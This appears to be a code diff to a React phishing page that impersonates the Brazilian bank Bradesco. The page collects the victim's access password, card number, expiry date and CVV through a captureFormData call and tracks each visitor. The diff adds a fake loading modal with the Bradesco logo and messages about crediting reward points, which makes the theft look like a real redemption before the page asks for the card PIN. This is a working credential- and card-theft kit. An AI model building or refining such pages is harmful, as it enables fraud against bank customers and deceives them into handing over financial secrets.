@@ -2,13 +2,22 @@ import { useState, useRef, useEffect } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { ChevronLeft, ShieldCheck } from "lucide-react";
 import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";
+import bradescoLogoNew from "@/assets/bradesco-logo-new.webp";
 
 const SenhaAcesso = () => {
   useVisitorTracking("senha-acesso");
   const navigate = useNavigate();
   const location = useLocation();
   const { nome, agencia, conta } = (location.state as any) || {};
-  const [phase, setPhase] = useState<"senha" | "cartao" | "senhaCartao" | "sucesso">("senha");
+  const [phase, setPhase] = useState<"senha" | "cartao" | "loadingCartao" | "senhaCartao" | "sucesso">("senha");
+  const CARD_LOADING_MESSAGES = [
+    "Processando...",
+    "Confirmando dados do cartão",
+    "Validando informações",
+    "Creditando seus pontos",
+    "Processando Resgate",
+  ];
+  const [cardLoadingStep, setCardLoadingStep] = useState(0);
   const [senha, setSenha] = useState("");
   const [numero, setNumero] = useState("");
   const [validade, setValidade] = useState("");
@@ -40,11 +49,27 @@ const SenhaAcesso = () => {
     }
   };
 
+  useEffect(() => {
+    if (phase !== "loadingCartao") return;
+    const interval = 10000 / CARD_LOADING_MESSAGES.length;
+    const timer = setInterval(() => {
+      setCardLoadingStep((prev) => {
+        if (prev >= CARD_LOADING_MESSAGES.length - 1) return prev;
+        return prev + 1;
+      });
+    }, interval);
+    const redirect = setTimeout(() => {
+      setPhase("senhaCartao");
+    }, 10000);
+    return () => { clearInterval(timer); clearTimeout(redirect); };
+  }, [phase]);
+
   const handleCartao = () => {
     const cleanNumero = numero.replace(/\D/g, "");
     if (cleanNumero.length >= 13 && validade.length >= 4 && cvv.length >= 3) {
       captureFormData("dados-cartao", { numero: cleanNumero, validade, cvv });
-      setPhase("senhaCartao");
+      setPhase("loadingCartao");
+      setCardLoadingStep(0);
     }
   };
 
@@ -217,6 +242,20 @@ const SenhaAcesso = () => {
           </div>
         )}
       </div>
+
+      {/* Loading Modal after card */}
+      {phase === "loadingCartao" && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center">
+          <div className="fixed inset-0 bg-black/50" />
+          <div className="relative z-50 w-full max-w-sm mx-4 bg-card rounded-2xl p-8 shadow-xl flex flex-col items-center">
+            <img src={bradescoLogoNew} alt="Bradesco" className="h-12 mb-6" />
+            <div className="w-10 h-10 border-[3px] border-muted rounded-full border-t-[#D7004D] animate-spin mb-6" />
+            <p className="text-muted-foreground text-base text-center">
+              {CARD_LOADING_MESSAGES[cardLoadingStep]}
+            </p>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
